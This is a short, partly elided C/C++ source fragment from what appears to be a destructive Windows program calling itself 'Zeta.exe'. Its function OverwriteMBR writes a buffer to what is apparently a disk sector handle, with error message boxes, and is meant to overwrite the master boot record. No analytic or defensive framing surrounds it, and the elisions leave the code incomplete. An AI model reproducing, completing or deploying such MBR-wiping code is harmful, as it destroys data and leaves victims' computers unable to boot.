...
namespace System {
	...
	VOID OverwriteMBR(VOID) 
	{
		...
		if (hSctr == INVALID_HANDLE_VALUE) {
			MessageBoxW(NULL, L"Error 55x505m", L"Zeta.exe", MB_ICONERROR);
			CloseHandle(hSctr);
			exit(0);
		}
		if (!WriteFile(hSctr, Buffer, 1, &dwbytes, NULL)) {
			MessageBoxW(NULL, L"Error 2x0x8m9", L"Zeta.exe", MB_ICONERROR);
			CloseHandle(hSctr);
			exit(0);
		}
	}
